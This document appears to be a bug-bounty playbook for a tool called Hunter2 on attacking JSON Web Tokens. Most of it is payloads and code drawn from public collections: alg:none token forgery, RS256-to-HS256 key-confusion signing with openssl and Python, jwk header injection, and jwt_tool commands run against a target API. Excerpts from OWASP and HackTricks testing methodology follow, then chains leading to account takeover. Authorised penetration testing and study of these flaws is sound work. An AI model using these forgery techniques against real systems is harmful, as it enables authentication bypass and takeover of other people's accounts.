# Real-World Playbook — JWT Attacks

**Class:** `jwt` · **Coverage-matrix tier:** 1 · **Hunter2:** /jwt-scan · tools/jwt_scanner.py · **Skill:** auth-attacks
**Sources:** [reddelexc/hackerone-reports](https://github.com/reddelexc/hackerone-reports) (disclosed reports) · [Az0x7/vulnerability-Checklist](https://github.com/Az0x7/vulnerability-Checklist) (test flow) · [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) + [payloadbox](https://github.com/payloadbox) (payloads) · [OWASP WSTG](https://github.com/OWASP/wstg) + [HowToHunt](https://github.com/KathanP19/HowToHunt) + [AllAboutBugBounty](https://github.com/daffainfo/AllAboutBugBounty) + [HackTricks](https://github.com/HackTricks-wiki/hacktricks) (method)

## Real payloads
*(actual attack strings — adapt to the injection context; fire only where a real sink exists)*

### PayloadsAllTheThings
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9        # header
eyJzdWIiOiIxMjM0[...]kbWluIjp0cnVlfQ        # payload
UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY # signature
```
```
{
    "typ": "JWT",
    "alg": "HS256"
}
```
```
{
    "sub":"1234567890",
    "name":"Amazing Haxx0r",
    "exp":"1466270722",
    "admin":true
}
```
```
python3 jwt_tool.py JWT_HERE -X n
```
```
{"alg":"HS256","typ":"JWT"}.
{"sub":"1234567890","name":"John Doe","iat":1516239022}
```
```
Invalid signature. Expected SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c got 9twuPVu9Wj3PBneGw1ctrf3knr7RX12v-UwocfLhXIs
Invalid signature. Expected 8Qh5lJ5gSaQylkSdaCIDBoOqKzhoJ0Nutkkap8RgB1Y= got 8Qh5lJ5gSaQylkSdaCIDBoOqKzhoJ0Nutkkap8RgBOo=
```
```
    python3 jwt_tool.py [JWT_HERE] -X a
```
```
    import jwt

    jwtToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0.YWUyMGU4YTI2ZGEyZTQ1MzYzOWRkMjI5YzIyZmZhZWM0NmRlMWVhNTM3NTQwYWY2MGU5ZGMwNjBmMmU1ODQ3OQ'
    decodedToken = jwt.decode(jwtToken, verify=False)       

    # decode the token before encoding with type 'None'
    noneEncoded = jwt.encode(decodedToken, key='', algorithm=None)

    print(noneEncoded.decode())
```
```
import jwt
public = open('public.pem', 'r').read()
print public
print jwt.encode({"data":"test"}, key=public, algorithm='HS256')
```
```
    python3 jwt_tool.py JWT_HERE -X k -pk my_public.pem
```
```
        $ cat key.pem | xxd -p | tr -d "\\n"
        2d2d2d2d2d424547494e20505[STRIPPED]592d2d2d2d2d0a
```
```
        $ echo -n "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzIiwidXNlcm5hbWUiOiJ2aXNpdG9yIiwicm9sZSI6IjEifQ" | openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e20505[STRIPPED]592d2d2d2d2d0a

        (stdin)= 8f421b351eb61ff226df88d526a7e9b9bb7b8239688c1f862f261a0c588910e0
```
```
        python2 -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('8f421b351eb61ff226df88d526a7e9b9bb7b8239688c1f862f261a0c588910e0')).replace('=','')\")"
```
```
        [HEADER EDITED RS256 TO HS256].[DATA EDITED].[SIGNATURE]
        eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzIiwidXNlcm5hbWUiOiJ2aXNpdG9yIiwicm9sZSI6IjEifQ.j0IbNR62H_Im34jVJqfpubt7gjlojB-GLyYaDFiJEOA
```
```
    python3 jwt_tool.py [JWT_HERE] -X i
```
```
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "kid": "jwt_tool",
    "use": "sig",
    "e": "AQAB",
    "n": "uKBGiwYqpqPzbK6_fyEp71H3oWqYXnGJk9TG3y9K_uYhlGkJHmMSkm78PWSiZzVh7Zj0SFJuNFtGcuyQ9VoZ3m3AGJ6pJ5PiUDDHLbtyZ9xgJHPdI_gkGTmT02Rfu9MifP-xz2ZRvvgsWzTPkiPn-_cFHKtzQ4b8T3w1vswTaIS8bjgQ2GBqp0hHzTBGN26zIU08WClQ1Gq4LsKgNKTjdYLsf0e9tdDt8Pe5-KKWjmnlhekzp_nnb4C2DMpEc1iVDmdHV2_DOpf-kH_1nyuCS9_MnJptF1NDtL_lLUyjyWiLzvLYUshAyAW6KORpGvo2wJa2SlzVtzVPmfgGW7Chpw"
  }
}.
{"login":"admin"}.
[Signed with new Private key; Public key injected]
```
```
$ docker run -it ttervoort/jws2pubkey JWS1 JWS2
$ docker run -it ttervoort/jws2pubkey "$(cat sample-jws/sample1.txt)" "$(cat sample-jws/sample2.txt)" | tee pubkey.jwk
Computing public key. This may take a minute...
{"kty": "RSA", "n": "sEFRQzskiSOrUYiaWAPUMF66YOxWymrbf6PQqnCdnUla8PwI4KDVJ2XgNGg9XOdc-jRICmpsLVBqW4bag8eIh35PClTwYiHzV5cbyW6W5hXp747DQWan5lIzoXAmfe3Ydw65cXnanjAxz8vqgOZP2ptacwxyUPKqvM4ehyaapqxkBbSmhba6160PEMAr4d1xtRJx6jCYwQRBBvZIRRXlLe9hrohkblSrih8MdvHWYyd40khrPU9B2G_PHZecifKiMcXrv7IDaXH-H_NbS7jT5eoNb9xG8K_j7Hc9mFHI7IED71CNkg9RlxuHwELZ6q-9zzyCCcS426SfvTCjnX0hrQ", "e": "AQAB"}
```
```
    jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSm9obiBEb2UifQ.xuEv8qrfXu424LZk8bVgr9MQJUIrp1rHcPyZw_KSsds
```

## Real attacker flow / methodology
*(how real hunters approach this class step by step)*

### From OWASP WSTG (testing guide)
### JSON Web Tokens

|ID          |
|------------|
|WSTG-SESS-10|

#### Summary

JSON Web Tokens (JWTs) are cryptographically signed JSON tokens, intended to share claims between systems. They are frequently used as authentication or session tokens, particularly on REST APIs.

JWTs are a common source of vulnerabilities, both in how they are in implemented in applications, and in the underlying libraries. As they are used for authentication, a vulnerability can easily result in a complete compromise of the application.

#### Test Objectives

- Determine whether the JWTs expose sensitive information.
- Determine whether the JWTs can be tampered with or modified.

#### How to Test

##### Overview

JWTs are made up of three components:

- The header
- The payload (or body)
- The signature

Each component is base64 encoded, and they are separated by periods (`.`). Keep in mind the base64 encoding used in a JWT strips out the equals signs (`=`), so you may need to add these back in to decode the sections.

##### Analyse the Contents

###### Header

The header defines the type of token (typically `JWT`), and the algorithm used for the signature. An example decoded header is shown below:

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

There are three main types of algorithms that are used to calculate the signatures:

| Algorithm | Description |
|-----------|-------------|
| HSxxx | HMAC using a secret key and SHA-xxx. |
| RSxxx and PSxxx | Public key signature using RSA. |
| ESxxx | Public key signature using ECDSA. |

There are also a wide range of [other algorithms](https://www.iana.org/assignments/jose/jose.xhtml#web-signature-encryption-algorithms) which may be used for encrypted tokens (JWEs), although these are less common.

###### Payload

The payload of the JWT contains the actual data. An example payload is shown below:

```json
{
  "username": "administrator",
  "is_admin": true,

*(truncated — open the source link for the full method)*

### From HackTricks (excerpt — see [HackTricks](https://github.com/HackTricks-wiki/hacktricks) for full)
### JWT Vulnerabilities (JSON Web Tokens)


Part of this page is based on the [**jwt_tool attack methodology**](https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology).<sup>[[3]](#references)</sup> The same author maintains [**jwt_tool**](https://github.com/ticarpi/jwt_tool) for JWT assessment.

##### **Quick Wins**

Run [**jwt_tool**](https://github.com/ticarpi/jwt_tool) with mode `All Tests!` and wait for green lines

```bash
python3 jwt_tool.py -M at \
    -t "https://api.example.com/api/v1/user/76bab5dd-9307-ab04-8123-fda81234245" \
    -rh "Authorization: Bearer eyJhbG...<JWT Token>"
```

If you are lucky the tool will find some case where the web application is incorrectly checking the JWT:


Then, you can search the request in your proxy or dump the used JWT for that request using jwt\_ tool:

```bash
python3 jwt_tool.py -Q "jwttool_706649b802c9f5e41052062a3787b291"

*(truncated — open the source link for the full method)*

## Chaining — always ask "what does this unlock?"
- alg:none forgery → forge any user → ATO
- RS256→HS256 confusion (sign with public key as HMAC secret) → forge tokens
- Weak HMAC secret crack (offline) → mint admin token
- kid header injection / jwk embedding → signature bypass

## Hunter2 wiring
- **Run:** `/jwt-scan · tools/jwt_scanner.py`
- **Skill:** `auth-attacks`
- **Coverage-matrix tier:** 1 (Tier 0 = test first)
